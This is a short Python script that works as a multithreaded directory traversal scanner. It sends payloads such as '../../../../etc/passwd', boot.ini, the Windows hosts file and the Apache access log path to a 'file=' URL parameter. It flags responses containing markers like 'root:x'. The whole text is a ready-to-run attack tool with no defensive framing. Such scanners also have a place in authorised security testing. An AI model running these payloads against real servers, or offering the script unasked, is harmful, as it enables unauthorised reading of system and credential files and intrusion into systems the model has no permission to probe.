import requests
from concurrent.futures import ThreadPoolExecutor


traversal_payloads = [
    '../../../../etc/passwd', 
    '../../../boot.ini',
    '../../../../../../../../Windows/System32/drivers/etc/hosts', 
    '../../../../../../../../var/log/apache2/access.log', 
  
]

def check_payload(url, payload):
    try:
        response = requests.get(url + payload)
      
        if response.status_code == 200:
            if any(keyword in response.text for keyword in ["root:x", "boot loader", "localhost", "127.0.0.1"]):
                return f"Potential Directory Traversal vulnerability found with payload: {payload}"
            else:
                return f"Payload {payload} appears safe."
        else:
            return f"Received status code {response.status_code} for payload {payload}."
    except requests.exceptions.RequestException as e:
        return f"Error scanning {url} with payload {payload}: {e}"

def scan_directory_traversal(url):
    print(f"Scanning {url} for Directory Traversal vulnerabilities...")
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(check_payload, url, payload) for payload in traversal_payloads]
        
        for future in futures:
            print(future.result())


if __name__ == "__main__":
    target_url = "http://example.com/resource?file="
    scan_directory_traversal(target_url)
